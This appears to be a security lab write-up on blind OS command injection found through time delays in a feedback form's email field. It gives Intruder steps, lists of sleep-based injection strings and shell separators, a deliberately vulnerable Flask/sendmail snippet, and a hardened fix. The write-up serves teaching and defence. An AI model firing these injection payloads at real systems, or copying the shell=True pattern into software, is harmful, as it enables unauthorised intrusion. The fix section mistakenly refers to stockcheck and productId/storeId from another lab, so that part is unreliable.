# Summary – Lab 2: Blind OS command injection with time delays

## Lab Information
**Topic:** OS command injection  
**Difficulty:** Apprentice

## Lab Description
This lab’s feedback form contains a blind OS command injection vulnerability. The server executes a shell command that includes user-supplied feedback fields (`name`, `email`, `subject`, `message`). The output of the command is not reflected in the HTTP response, so the vulnerability must be detected using side channels. In this case, exploiting `sleep` to induce a delay in the server’s response demonstrates command execution.

## Vulnerability Analysis
The feedback submission handler likely invokes a system utility (for example, to send an email or log feedback) via a shell command constructed from user input. Because the output of the command is discarded, there is no direct evidence of execution in the response body. However, by injecting a time-based payload (such as `$(sleep 10)`), we can detect OS command injection from the increased response time.

This is a classic **blind** OS command injection scenario where timing attacks are used to discover and exploit the vulnerability.

## Exploitation Steps
1. **Locate the feedback form**
   - Visit `/feedback` to find the form with fields: `name`, `email`, `subject`, `message`.
2. **Identify the submission endpoint**
   - The form submits to `POST /feedback/submit` and includes a CSRF token.
3. **Set up an Intruder Sniper attack**
   - Target parameters: `name`, `email`, `subject`, `message`.
   - Payload list: various OS injection strings containing `sleep 5` (see Payloads List), using different separators (`;`, `&&`, backticks, `$()`) (see Separtors List).
4. **Detect the vulnerable parameter**
   - Measure response time for each injected parameter.
   - The `email` field shows a noticeable delay when payloads like `$(sleep 5)` are injected, indicating OS command execution.
5. **Exploit with a longer delay**
   - Send a crafted request with:
     - `email=email@example.com$(sleep 10)` (plus the correct CSRF token).
   - The server takes roughly 10 seconds to respond, proving that the `sleep` command was executed.
6. **Observe Lab is solved.**

## Payloads List
Time delay commands (for Linux)
```sh
sleep <seconds>
ping -i <seconds/iterations> 127.0.0.1
timeout 10 sh -c 'while true; do :; done'
timeout 10 bash -c 'echo done'
read -t 10 dummy
bash -c 'read -t 10 <> <(:)'
python -c "import time; time.sleep(10)"
php -r "usleep(10000000);"
php -r "time_nanosleep(10, 0);" 
```

Time delay commands (for Windows)
```sh
timeout /T 10 /NOBREAK >nul
ping 127.0.0.1 -n 11 >nul
powershell -Command "Start-Sleep -Seconds 10"
powershell -c "Start-Sleep 10"
```

## Separators List
```sh
;
|
||
&
&&
\n
`(payload)`
$(payload)
```

## Custom List
```sh
;{${sleep(10)}}
&{${sleep(10)}}
&&{${sleep(10)}}
|{${sleep(10)}}
||{${sleep(10)}}
;eval('sleep 10')
&eval('sleep 10')
&&eval('sleep 10')
|eval('sleep 10')
||eval('sleep 10')
;exec('sleep 10')
&exec('sleep 10')
&&exec('sleep 10')
|exec('sleep 10')
||exec('sleep 10')

;{${sleep(10)}};
&{${sleep(10)}}$
&&{${sleep(10)}}$$
|{${sleep(10)}}|
||{${sleep(10)}}||
;eval('sleep 10');
&eval('sleep 10')$
&&eval('sleep 10')$$
|eval('sleep 10')|
||eval('sleep 10')||
;exec('sleep 10');
&exec('sleep 10')&
&&exec('sleep 10')&&
|exec('sleep 10')|
||exec('sleep 10')||

;sleep 10
|sleep 10
||sleep 10
&sleep 10
&&sleep 10
\nsleep 10
`(sleep 10
$(sleep 10
;sleep 10;
|sleep 10|
||sleep 10||
&sleep 10&
&&sleep 10&&
\nsleep 10\n
`(sleep 10)`
$(sleep 10)
```

## AppSec Perspective

### What the underlying code might be
A simplified vulnerable implementation in Python might look like:

```python
import subprocess
from flask import request

def submit_feedback():
    name = request.form.get("name", "")
    email = request.form.get("email", "")
    subject = request.form.get("subject", "")
    message = request.form.get("message", "")

    # VULNERABLE: shell command using user input,
    # executed asynchronously, output is discarded.
    cmd = (
        f"/usr/sbin/sendmail '{email}' <<EOF\n"
        f"Subject: {subject}\nFrom: {name}\n\n{message}\nEOF"
    )
    subprocess.Popen(cmd, shell=True)  # asynchronous, no captured output

    return "Thanks for your feedback"
```

### Security issues enabling exploitation
- **Shell command built from user-controlled fields** without sanitization.
- Use of `subprocess.Popen(..., shell=True)` to execute potentially complex shell pipelines.
- **No separation of email addresses or content from the shell environment** (e.g. not using a proper mail library or SMTP client with parameterization).
- Application does not surface command output, making detection harder but still possible via timing.

### How to fix it
1. **Avoid the shell entirely (primary fix)**  
   - Use safe APIs that pass arguments as a list and do not invoke a shell:
   ```python
   cmd = ["/usr/local/bin/stockcheck", product_id, store_id]
   output = subprocess.check_output(cmd, shell=False, text=True)
   ```
   - In Node.js, use `spawn`/`execFile` with an array of arguments and no shell.

2. **Apply strict input validation / allow-listing**
   - `productId` and `storeId` should be numeric or selected from known identifiers.
   - Enforce type and range constraints server-side (e.g. only digits, length limits).

3. **Least privilege & separation of duties**
   - Run the web application under an account with minimal OS privileges.
   - If possible, isolate the stock-checking logic in a separate service, not via shell.

4. **Remove dependence on shell commands**
   - Use language-level libraries for email sending (e.g. Python’s `smtplib`, frameworks’ email APIs) instead of `sendmail` via shell.
   - If possible, delegate email sending to a separate service that is not directly exposed to user input.

5. **Implement logging and detection**
   - Monitor for unusually long request times, especially when correlated with specific parameters.
   - Use application and security logs to alert on suspicious patterns (e.g., presence of `sleep`, `;`, `&&` in inputs).
### Safe code version
```python
import re
import subprocess
from flask import request, abort

SENDMAIL_PATH = "/usr/sbin/sendmail"

# Allow only "normal" header characters: letters, digits, space, and some punctuation.
# This is a strict allow-list to avoid CRLF, control chars, etc.
HEADER_RE = re.compile(r"^[A-Za-z0-9 .,'\"()\-]*$")

# Basic email pattern for demonstration; in real apps use a robust library (e.g. email-validator).
EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")

MAX_NAME_LEN = 200
MAX_SUBJECT_LEN = 200
MAX_EMAIL_LEN = 254
MAX_MESSAGE_LEN = 10_000  # body can be larger but still should be bounded


def _validate_header_field(value: str, max_len: int, field_name: str) -> str:
    """
    Validate a header-like field using an allow-list:
    - strip leading/trailing whitespace
    - enforce length
    - enforce allowed character set (no CR/LF, no control characters)
    """
    value = (value or "").strip()

    if len(value) > max_len:
        abort(400, description=f"{field_name} too long")

    if not HEADER_RE.fullmatch(value):
        # OWASP-style: fail closed when unexpected characters appear.
        abort(400, description=f"Invalid characters in {field_name}")

    return value


def _validate_email(email: str) -> str:
    # First apply generic header validation (length & allowed chars)
    email = _validate_header_field(email, MAX_EMAIL_LEN, "email")

    # Then apply more specific email shape check
    if not EMAIL_RE.fullmatch(email):
        abort(400, description="Invalid email address")

    return email


def submit_feedback():
    # 1. Extract raw inputs
    raw_name = request.form.get("name", "")
    raw_email = request.form.get("email", "")
    raw_subject = request.form.get("subject", "")
    raw_message = request.form.get("message", "")

    # 2. Strong validation / allow-listing for header fields
    name = _validate_header_field(raw_name, MAX_NAME_LEN, "name")
    email = _validate_email(raw_email)
    subject = _validate_header_field(raw_subject, MAX_SUBJECT_LEN, "subject")

    # 3. Message body: allow newlines, but bound the size
    message = raw_message or ""
    if len(message) > MAX_MESSAGE_LEN:
        abort(400, description="message too long")

    # 4. Build RFC5322-ish message.
    #    No CRLF injection possible because headers are allow-listed.
    email_body = (
        f"To: {email}\n"
        f"From: {name or 'no-reply@example.com'}\n"
        f"Subject: {subject}\n"
        "\n"
        f"{message}\n"
    )

    # 5. Call sendmail safely WITHOUT a shell.
    try:
        proc = subprocess.Popen(
            [SENDMAIL_PATH, "-i", "--", email],  # args list → no shell
            stdin=subprocess.PIPE,
            text=True,
        )
        proc.communicate(email_body, timeout=10)

        if proc.returncode != 0:
            # In a real app, log return code / stderr, but don't leak details to user.
            abort(500, description="Failed to send feedback")
    except Exception:
        abort(500, description="Failed to send feedback")

    return "Thanks for your feedback"
```

## Key Takeaways

**Lessons from Attacker perspective**
- When no output is reflected, use **timing-based payloads** like `sleep N` or `ping -i N 127.0.0.1` to detect blind command injection.
- Testing different separators and wrappers (`;`, `&`, `|`, backticks, `$()`, newlines) helps bypass simple filters (increases chances of hitting the vulnerable parameter and syntax).
- Test all user-controllable parameters (injection points), not just the obviously “dangerous” ones; in this lab it's not only the `email` field.
- Combining automation (Intruder / custom scripts) with precise timings is effective for blind injection discovery.

**Lessons from AppSec (defender) perspective**
- Treat any OS command execution as a high-risk operation; avoid it where possible (Remove shell usage in business logic; use high-level libraries that do not expose OS commands).
- Never pass untrusted input into a shell; use parameterized process APIs with allow-listed arguments.
- Apply least privilege and avoid exposing raw backend or OS-level output to clients.
